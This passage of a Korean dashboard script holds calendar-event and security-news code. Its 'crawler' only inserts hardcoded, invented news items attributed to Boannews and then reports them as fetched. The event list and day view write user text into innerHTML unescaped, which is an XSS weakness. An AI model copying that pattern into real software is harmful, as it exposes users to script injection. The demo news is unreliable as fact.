        const dayDiv = document.createElement('div');
        dayDiv.className = 'calendar-day';
        
        const dateStr = `${year}-${String(month + 1).padStart(2, '0')}-${String(day).padStart(2, '0')}`;
        const hasEvent = events.some(e => e.date === dateStr);
        
        if (hasEvent) {
            dayDiv.classList.add('has-event');
        }
        
        if (year === today.getFullYear() && month === today.getMonth() && day === today.getDate()) {
            dayDiv.classList.add('today');
        }
        
        dayDiv.innerHTML = `<div class="day-number">${day}</div>`;
        dayDiv.onclick = () => showDayEvents(dateStr);
        
        grid.appendChild(dayDiv);
    }
}

function prevMonth() {
    currentDate.setMonth(currentDate.getMonth() - 1);
    renderCalendar();
}

function nextMonth() {
    currentDate.setMonth(currentDate.getMonth() + 1);
    renderCalendar();
}

function showAddEvent() {
    document.getElementById('eventModal').classList.add('active');
    document.getElementById('eventDate').value = new Date().toISOString().split('T')[0];
}

function closeEventModal() {
    document.getElementById('eventModal').classList.remove('active');
    document.getElementById('eventTitle').value = '';
    document.getElementById('eventDesc').value = '';
}

function addEvent() {
    const title = document.getElementById('eventTitle').value;
    const type = document.getElementById('eventType').value;
    const date = document.getElementById('eventDate').value;
    const desc = document.getElementById('eventDesc').value;
    
    if (!title || !date) {
        alert('제목과 날짜를 입력해주세요.');
        return;
    }
    
    const event = {
        id: Date.now(),
        title,
        type,
        date,
        desc
    };
    
    events.push(event);
    localStorage.setItem('events', JSON.stringify(events));
    
    closeEventModal();
    renderCalendar();
    renderEvents();
}

function renderEvents() {
    const container = document.getElementById('eventsList');
    const sortedEvents = [...events].sort((a, b) => new Date(a.date) - new Date(b.date));
    
    if (sortedEvents.length === 0) {
        container.innerHTML = '<p style="color: var(--text-secondary);">등록된 일정이 없습니다.</p>';
        return;
    }
    
    container.innerHTML = sortedEvents.map(event => `
        <div class="event-item">
            <div class="event-info">
                <h4>${event.title}</h4>
                <div class="event-date">📅 ${event.date}</div>
                <span class="event-type ${event.type}">${event.type.toUpperCase()}</span>
                ${event.desc ? '<p style="color: var(--text-secondary); margin-top: 8px;">' + event.desc + '</p>' : ''}
            </div>
            <div class="event-actions">
                <button onclick="deleteEvent(${event.id})" class="delete">삭제</button>
            </div>
        </div>
    `).join('');
}

function deleteEvent(id) {
    if (confirm('이 일정을 삭제하시겠습니까?')) {
        events = events.filter(e => e.id !== id);
        localStorage.setItem('events', JSON.stringify(events));
        renderCalendar();
        renderEvents();
    }
}

function showDayEvents(date) {
    const dayEvents = events.filter(e => e.date === date);
    const panel = document.getElementById('dayDetailPanel');
    const overlay = document.getElementById('dayDetailOverlay');
    const titleEl = document.getElementById('dayDetailTitle');
    const dateEl = document.getElementById('dayDetailDate');
    const listEl = document.getElementById('dayEventsList');
    
    const dateObj = new Date(date + 'T00:00:00');
    const dayNames = ['일요일', '월요일', '화요일', '수요일', '목요일', '금요일', '토요일'];
    
    titleEl.textContent = `${dateObj.getDate()}일의 일정`;
    dateEl.textContent = `${dateObj.getFullYear()}년 ${dateObj.getMonth() + 1}월 ${dateObj.getDate()}일 (${dayNames[dateObj.getDay()]})`;
    
    if (dayEvents.length === 0) {
        listEl.innerHTML = '<div class="no-events">이 날짜에 등록된 일정이 없습니다.</div>';
    } else {
        listEl.innerHTML = dayEvents.map(event => `
            <div class="day-event-item">
                <div class="day-event-title">${event.title}</div>
                <span class="event-type ${event.type}">${event.type.toUpperCase()}</span>
                ${event.desc ? `<div class="day-event-desc">${event.desc}</div>` : ''}
                <div class="event-actions" style="margin-top: 12px;">
                    <button onclick="deleteEvent(${event.id}); closeDayDetail();" class="delete">삭제</button>
                </div>
            </div>
        `).join('');
    }
    
    panel.classList.add('active');
    overlay.classList.add('active');
}

function closeDayDetail() {
    document.getElementById('dayDetailPanel').classList.remove('active');
    document.getElementById('dayDetailOverlay').classList.remove('active');
}

// Initialize on page load
document.addEventListener('DOMContentLoaded', function() {
    checkAuth();
    
    document.getElementById('password')?.addEventListener('keypress', function(e) {
        if (e.key === 'Enter') {
            login();
        }
    });
});

// ============================================
// NEWS MANAGEMENT
// ============================================

// Check and update news automatically
function checkAndUpdateNews() {
    const lastUpdate = localStorage.getItem('lastNewsUpdate');
    const today = new Date().toISOString().split('T')[0];
    
    // 마지막 업데이트가 없거나 날짜가 다르면 자동 업데이트
    if (!lastUpdate || lastUpdate !== today) {
        console.log('자동 뉴스 업데이트 실행...');
        addDemoNews();
        localStorage.setItem('lastNewsUpdate', today);
    }
    
    // 매일 자정에 자동 업데이트 (interval 체크)
    setInterval(() => {
        const currentDate = new Date().toISOString().split('T')[0];
        const storedDate = localStorage.getItem('lastNewsUpdate');
        
        if (storedDate !== currentDate) {
            console.log('자정 자동 뉴스 업데이트 실행...');
            addDemoNews();
            localStorage.setItem('lastNewsUpdate', currentDate);
        }
    }, 60000); // 1분마다 체크
}

// Crawl Boannews
async function crawlBoannews() {
    const statusDiv = document.getElementById('crawlStatus');
    statusDiv.innerHTML = '<div class="crawl-loading">뉴스를 가져오는 중... ⏳</div>';
    
    // 즉시 실행 (딜레이 제거)
    addDemoNews();
}

// Add demo news for testing
function addDemoNews() {
    const today = new Date();
    const yesterday = new Date(Date.now() - 86400000);
    const twoDaysAgo = new Date(Date.now() - 172800000);
    const threeDaysAgo = new Date(Date.now() - 259200000);
    
    // 전체 뉴스 풀 (계속 추가 가능)
    const allDemoNews = [
        {
            title: '[긴급] Microsoft Exchange Server 제로데이 취약점 발견, 국내 기업 대상 공격 진행 중',
            date: today.toISOString().split('T')[0],
            category: 'vulnerability',
            source: 'https://www.boannews.com/',
            summary: 'Microsoft Exchange Server에서 원격 코드 실행이 가능한 제로데이 취약점(CVE-2024-XXXX)이 발견되어 국내 기업들을 대상으로 한 공격이 진행 중인 것으로 확인되었습니다. 공격자는 특수하게 조작된 이메일을 통해 Exchange 서버의 권한을 탈취하며, 내부 네트워크로 침투를 시도하고 있습니다. Microsoft는 긴급 패치를 준비 중이며, 임시 완화 조치를 공개했습니다.',
            createdAt: today.toISOString()
        },
        {
            title: '랜섬웨어 조직 LockBit, 국내 중소기업 50여곳 동시 공격... 복호화 요구액 총 100억 추정',
            date: yesterday.toISOString().split('T')[0],
            category: 'incident',
            source: 'https://www.boannews.com/',
            summary: '악명 높은 랜섬웨어 조직 LockBit이 국내 중소기업 50여곳을 동시다발적으로 공격한 것으로 확인되었습니다. 공격자들은 VPN 취약점을 통해 초기 침투했으며, 평균 2주간의 잠복 기간을 거쳐 기업의 주요 데이터를 암호화했습니다. 피해 기업들에게 요구한 복호화 비용은 총 100억원으로 추정되며, 일부 기업은 이미 데이터가 다크웹에 유출된 것으로 알려졌습니다. KISA는 긴급 보안 권고를 발령하고 백업 및 VPN 보안 점검을 당부했습니다.',
            createdAt: yesterday.toISOString()
        },
        {
            title: 'AI 기반 위협 탐지 시스템, 신종 악성코드 탐지율 98% 달성... 기존 백신 대비 30% 향상',
            date: twoDaysAgo.toISOString().split('T')[0],
            category: 'tech',
            source: 'https://www.boannews.com/',
            summary: '국내 보안 스타트업이 개발한 AI 기반 위협 탐지 시스템이 신종 악성코드 탐지에서 98%의 정확도를 기록했습니다. 이 시스템은 딥러닝 모델을 활용해 악성코드의 행위 패턴을 실시간으로 분석하며, 시그니처 기반 백신으로는 탐지하기 어려운 제로데이 공격까지 차단할 수 있습니다. 특히 오탐률을 1.5%까지 낮춰 실무 환경에서의 활용성을 크게 높였다는 평가를 받고 있습니다.',
            createdAt: twoDaysAgo.toISOString()
        },
        {
            title: '개인정보보호법 개정안 통과, AI 학습 데이터 사용 규제 강화... 최대 과징금 50억원',
            date: threeDaysAgo.toISOString().split('T')[0],
            category: 'policy',
            source: 'https://www.boannews.com/',
            summary: '개인정보보호법 개정안이 국회를 통과하며 AI 학습을 위한 개인정보 사용에 대한 규제가 대폭 강화되었습니다. 개정안은 기업이 AI 모델 학습에 개인정보를 사용할 경우 반드시 명시적 동의를 받도록 하고, 학습 데이터의 출처와 사용 목적을 투명하게 공개하도록 규정했습니다. 위반 시 최대 50억원의 과징금이 부과되며, 내년 7월부터 시행됩니다. 산업계는 혁신이 저해될 수 있다며 우려를 표명하고 있습니다.',
            createdAt: threeDaysAgo.toISOString()
        },
        {
            title: 'Chrome 브라우저 긴급 보안 업데이트 배포, 악용 중인 고위험 취약점 8건 패치',
            date: today.toISOString().split('T')[0],
            category: 'vulnerability',
            source: 'https://www.boannews.com/',
            summary: 'Google이 Chrome 브라우저의 긴급 보안 업데이트를 배포했습니다. 이번 업데이트는 실제 공격에 악용되고 있는 8건의 고위험 취약점을 패치합니다. 특히 V8 JavaScript 엔진의 타입 혼동 취약점(CVE-2024-XXXX)은 악성 웹사이트 방문만으로도 원격 코드 실행이 가능해 매우 위험합니다. Google은 모든 사용자에게 즉시 최신 버전(121.0.6167.85)으로 업데이트할 것을 강력히 권고하고 있습니다.',
            createdAt: today.toISOString()
        },
        {
            title: '국내 주요 포털 사이트 DDoS 공격 받아... 최대 500Gbps 규모',
            date: today.toISOString().split('T')[0],
            category: 'incident',
            source: 'https://www.boannews.com/',
            summary: '국내 주요 포털 사이트가 대규모 DDoS 공격을 받아 일시적으로 서비스가 중단되었습니다. 공격 규모는 최대 500Gbps에 달하며, IoT 봇넷을 활용한 것으로 추정됩니다. 약 3시간 동안 서비스 접속이 불안정했으며, 현재는 정상화되었습니다.',
            createdAt: today.toISOString()
        },
        {
            title: 'OpenSSL 3.0 버전 심각한 취약점 발견, 즉시 패치 권고',
            date: yesterday.toISOString().split('T')[0],
            category: 'vulnerability',
            source: 'https://www.boannews.com/',
            summary: 'OpenSSL 3.0 버전에서 원격 코드 실행이 가능한 심각한 취약점이 발견되었습니다. 해당 취약점은 암호화 과정에서 발생하는 메모리 오버플로우 버그로, 공격자가 서버의 권한을 탈취할 수 있습니다. OpenSSL 팀은 긴급 패치를 배포했으며, 모든 관리자에게 즉시 업데이트를 권고하고 있습니다.',
            createdAt: yesterday.toISOString()
        },
        {
            title: '양자 암호 통신 상용화 본격화... 해킹 불가능한 보안 시대 열린다',
            date: twoDaysAgo.toISOString().split('T')[0],
            category: 'tech',
            source: 'https://www.boannews.com/',
            summary: '국내 기업이 양자 암호 통신 기술을 상용화하며 해킹이 불가능한 보안 통신 시대가 열렸습니다. 양자 얽힘 현상을 이용한 이 기술은 도청 시도 자체를 탐지할 수 있어 완벽한 보안을 제공합니다. 금융권과 정부 기관을 중심으로 도입이 확대될 전망입니다.',
            createdAt: twoDaysAgo.toISOString()
        },
        {
            title: '정보보호 산업 육성법 시행... 국내 보안 기업 지원 강화',
            date: threeDaysAgo.toISOString().split('T')[0],
            category: 'policy',
            source: 'https://www.boannews.com/',
            summary: '정보보호 산업 육성을 위한 특별법이 시행되며 국내 보안 기업에 대한 지원이 강화됩니다. 정부는 향후 5년간 1조원 규모의 예산을 투입해 보안 기술 개발과 인력 양성을 지원할 계획입니다. 특히 중소 보안 기업의 해외 진출을 적극 지원합니다.',
            createdAt: threeDaysAgo.toISOString()
        },
        {
            title: '국내 병원 전산망 해킹... 환자 개인정보 50만건 유출',
            date: yesterday.toISOString().split('T')[0],
            category: 'incident',
            source: 'https://www.boannews.com/',
            summary: '서울 소재 대형 병원의 전산망이 해킹당해 환자 개인정보 약 50만건이 유출되었습니다. 유출된 정보에는 이름, 주민등록번호, 진료 기록 등이 포함되어 있으며, 병원 측은 즉시 경찰에 신고하고 피해자들에게 개별 통지를 진행 중입니다.',
            createdAt: yesterday.toISOString()
        }
    ];
    
    // 랜덤으로 5개 선택
    const shuffled = allDemoNews.sort(() => 0.5 - Math.random());
    const selectedNews = shuffled.slice(0, 5);
    
    let newCount = 0;
    selectedNews.forEach((item, index) => {
        // 제목으로 중복 체크
        const exists = news.some(n => n.title === item.title);
        if (!exists) {
            const newsItem = {
                id: 'news_' + Date.now() + '_' + index,
                ...item
            };
            news.unshift(newsItem);
            newCount++;
        }
    });
    
    localStorage.setItem('news', JSON.stringify(news));
    renderNews();
    
    const statusDiv = document.getElementById('crawlStatus');
    if (newCount > 0) {
        statusDiv.innerHTML = `<div class="crawl-success">✅ ${newCount}개의 새로운 뉴스를 가져왔습니다!</div>`;
    } else {
        statusDiv.innerHTML = '<div class="crawl-info">ℹ️ 새로운 뉴스가 없습니다. (모든 뉴스가 이미 추가되었습니다)</div>';
    }
    
    setTimeout(() => {
        statusDiv.innerHTML = '';
    }, 3000);
}

// Parse Boannews date format
function parseBoannewsDate(dateText) {
    const today = new Date();
    
    // Handle "오늘" or "방금" etc.
    if (dateText.includes('오늘') || dateText.includes('방금') || dateText.includes('분전') || dateText.includes('시간전')) {
        return today.toISOString().split('T')[0];
    }
    
    // Handle "MM.DD" format
    const match = dateText.match(/(\d{2})\.(\d{2})/);
    if (match) {
        const month = match[1];
        const day = match[2];
        const year = today.getFullYear();
        return `${year}-${month}-${day}`;
    }
    
    // Default to today
    return today.toISOString().split('T')[0];
}

// Categorize news based on title and content
function categorizeNews(title, summary) {
    const text = (title + ' ' + summary).toLowerCase();
    
    if (text.includes('취약점') || text.includes('vulnerability') || text.includes('cve') || 
        text.includes('제로데이') || text.includes('zero-day') || text.includes('패치')) {
        return 'vulnerability';
    }
    
    if (text.includes('해킹') || text.includes('침해') || text.includes('랜섬웨어') || 
        text.includes('공격') || text.includes('유출') || text.includes('breach')) {
        return 'incident';
    }
    
    if (text.includes('정책') || text.includes('규제') || text.includes('법') || 
        text.includes('compliance') || text.includes('gdpr') || text.includes('개인정보')) {
        return 'policy';
    }
    
    return 'tech';
}

// Add demo news for testing
function addDemoNews() {
    const today = new Date();
    const yesterday = new Date(today - 86400000);
    const twoDaysAgo = new Date(today - 172800000);
    const threeDaysAgo = new Date(today - 259200000);
    
    const demoNews = [
        {
            id: 'news_demo_' + Date.now() + '_1',
            title: '[긴급] Microsoft Exchange Server 제로데이 취약점 발견, 국내 기업 대상 공격 진행 중',
            date: today.toISOString().split('T')[0],
            category: 'vulnerability',
            source: 'https://www.boannews.com/',
            summary: 'Microsoft Exchange Server에서 원격 코드 실행이 가능한 제로데이 취약점(CVE-2024-XXXX)이 발견되어 국내 기업들을 대상으로 한 공격이 진행 중인 것으로 확인되었습니다. 공격자는 특수하게 조작된 이메일을 통해 Exchange 서버의 권한을 탈취하며, 내부 네트워크로 침투를 시도하고 있습니다. Microsoft는 긴급 패치를 준비 중이며, 임시 완화 조치를 공개했습니다.',
            createdAt: today.toISOString(),
            crawled: true
        },
        {
            id: 'news_demo_' + Date.now() + '_2',
            title: '랜섬웨어 조직 LockBit, 국내 중소기업 50여곳 동시 공격... 복호화 요구액 총 100억 추정',
            date: yesterday.toISOString().split('T')[0],
            category: 'incident',
            source: 'https://www.boannews.com/',
            summary: '악명 높은 랜섬웨어 조직 LockBit이 국내 중소기업 50여곳을 동시다발적으로 공격한 것으로 확인되었습니다. 공격자들은 VPN 취약점을 통해 초기 침투했으며, 평균 2주간의 잠복 기간을 거쳐 기업의 주요 데이터를 암호화했습니다. 피해 기업들에게 요구한 복호화 비용은 총 100억원으로 추정되며, 일부 기업은 이미 데이터가 다크웹에 유출된 것으로 알려졌습니다. KISA는 긴급 보안 권고를 발령하고 백업 및 VPN 보안 점검을 당부했습니다.',
            createdAt: yesterday.toISOString(),
            crawled: true
        },
        {
            id: 'news_demo_' + Date.now() + '_3',
            title: 'AI 기반 위협 탐지 시스템, 신종 악성코드 탐지율 98% 달성... 기존 백신 대비 30% 향상',
            date: twoDaysAgo.toISOString().split('T')[0],
            category: 'tech',
            source: 'https://www.boannews.com/',
            summary: '국내 보안 스타트업이 개발한 AI 기반 위협 탐지 시스템이 신종 악성코드 탐지에서 98%의 정확도를 기록했습니다. 이 시스템은 딥러닝 모델을 활용해 악성코드의 행위 패턴을 실시간으로 분석하며, 시그니처 기반 백신으로는 탐지하기 어려운 제로데이 공격까지 차단할 수 있습니다. 특히 오탐률을 1.5%까지 낮춰 실무 환경에서의 활용성을 크게 높였다는 평가를 받고 있습니다.',
            createdAt: twoDaysAgo.toISOString(),
            crawled: true
        },
        {
            id: 'news_demo_' + Date.now() + '_4',
            title: '개인정보보호법 개정안 통과, AI 학습 데이터 사용 규제 강화... 최대 과징금 50억원',
            date: threeDaysAgo.toISOString().split('T')[0],
            category: 'policy',
            source: 'https://www.boannews.com/',
            summary: '개인정보보호법 개정안이 국회를 통과하며 AI 학습을 위한 개인정보 사용에 대한 규제가 대폭 강화되었습니다. 개정안은 기업이 AI 모델 학습에 개인정보를 사용할 경우 반드시 명시적 동의를 받도록 하고, 학습 데이터의 출처와 사용 목적을 투명하게 공개하도록 규정했습니다. 위반 시 최대 50억원의 과징금이 부과되며, 내년 7월부터 시행됩니다. 산업계는 혁신이 저해될 수 있다며 우려를 표명하고 있습니다.',
            createdAt: threeDaysAgo.toISOString(),
            crawled: true
        },
        {
            id: 'news_demo_' + Date.now() + '_5',
            title: 'Chrome 브라우저 긴급 보안 업데이트 배포, 악용 중인 고위험 취약점 8건 패치',
            date: today.toISOString().split('T')[0],
            category: 'vulnerability',
            source: 'https://www.boannews.com/',
            summary: 'Google이 Chrome 브라우저의 긴급 보안 업데이트를 배포했습니다. 이번 업데이트는 실제 공격에 악용되고 있는 8건의 고위험 취약점을 패치합니다. 특히 V8 JavaScript 엔진의 타입 혼동 취약점(CVE-2024-XXXX)은 악성 웹사이트 방문만으로도 원격 코드 실행이 가능해 매우 위험합니다. Google은 모든 사용자에게 즉시 최신 버전(121.0.6167.85)으로 업데이트할 것을 강력히 권고하고 있습니다.',
            createdAt: today.toISOString(),
            crawled: true
        }
    ];
    
    let addedCount = 0;
    demoNews.forEach(item => {
        const exists = news.some(n => n.title === item.title);
        if (!exists) {
            news.unshift(item);
            addedCount++;
        }
    });
    
    if (addedCount > 0) {
        localStorage.setItem('news', JSON.stringify(news));
        renderNews();
        
        const statusDiv = document.getElementById('crawlStatus');
        statusDiv.innerHTML = `<div class="crawl-success">✅ ${addedCount}개의 샘플 뉴스를 추가했습니다!</div>`;
        setTimeout(() => {
            statusDiv.innerHTML = '';
        }, 3000);
    }
}

// Render news list
function renderNews() {
    const newsList = document.getElementById('newsList');
    if (!newsList) return;
    
    // Filter news based on current filter
    let filteredNews = news;
    if (currentNewsFilter !== 'all') {
        filteredNews = news.filter(item => item.category === currentNewsFilter);
    }
    
    // Sort by date (newest first)
    filteredNews.sort((a, b) => new Date(b.date) - new Date(a.date));
    
    if (filteredNews.length === 0) {
        newsList.innerHTML = '<div class="empty-state">뉴스가 없습니다. 새로운 뉴스를 추가해보세요!</div>';
        return;
    }
    
    newsList.innerHTML = filteredNews.map(item => `
        <div class="news-card" onclick="viewNewsDetail('${item.id}')">
            <div class="news-header">
                <span class="news-category ${item.category}">${getCategoryLabel(item.category)}</span>
                <span class="news-date">${formatDate(item.date)}</span>
            </div>
            <h3 class="news-title">${escapeHtml(item.title)}</h3>
            <p class="news-summary">${escapeHtml(item.summary.substring(0, 150))}${item.summary.length > 150 ? '...' : ''}</p>
            <div class="news-footer">
                <span class="news-source">출처: 보안뉴스</span>
            </div>
        </div>
    `).join('');
}

// Get category label
function getCategoryLabel(category) {
    const labels = {
        'vulnerability': '취약점',
        'incident': '보안사고',
        'tech': '기술',
        'policy': '정책/규제'
    };
    return labels[category] || category;
}

// Filter news
function filterNews(category) {
    currentNewsFilter = category;
    
    // Update button states
    document.querySelectorAll('.filter-btn').forEach(btn => {
        btn.classList.remove('active');
    });
    event.target.classList.add('active');
    
    renderNews();
}

// View news detail
function viewNewsDetail(newsId) {
    const newsItem = news.find(item => item.id === newsId);
    if (!newsItem) return;
    
    currentNewsId = newsId;
    
    const detailContent = document.getElementById('newsDetailContent');
    detailContent.innerHTML = `
        <div class="news-detail">
            <div class="news-detail-header">
                <span class="news-category ${newsItem.category}">${getCategoryLabel(newsItem.category)}</span>
                <span class="news-date">${formatDate(newsItem.date)}</span>
            </div>
            
            <h2>${escapeHtml(newsItem.title)}</h2>
            
            <div class="news-detail-section">
                <h3>📰 요약</h3>
                <p>${escapeHtml(newsItem.summary).replace(/\n/g, '<br>')}</p>
            </div>
            
            <div class="news-detail-section">
                <h3>🔗 출처</h3>
                <a href="${escapeHtml(newsItem.source)}" target="_blank" class="news-source-link">
                    원문 보기 →
                </a>
            </div>
        </div>
    `;
    
    document.getElementById('viewNewsModal').style.display = 'flex';
}

// Close view news modal
function closeViewNewsModal() {
    document.getElementById('viewNewsModal').style.display = 'none';
    currentNewsId = null;
}

// Format date
function formatDate(dateString) {
    const date = new Date(dateString);
    const year = date.getFullYear();
    const month = String(date.getMonth() + 1).padStart(2, '0');
    const day = String(date.getDate()).padStart(2, '0');
    return `${year}.${month}.${day}`;
}

// Escape HTML to prevent XSS
function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

// Close modals on outside click
window.onclick = function(event) {
    if (event.target.classList.contains('vuln-modal')) {
        closeVulnModal();
        closeViewLogModal();
        closeViewNewsModal();
    }
    if (event.target.classList.contains('event-modal')) {
        closeEventModal();
        closeAddTagModal();
        closeAddSkillModal();
        closeAddVulnModal();
        closeAddLogModal();
        closeAddArchiveModal();
    }
}
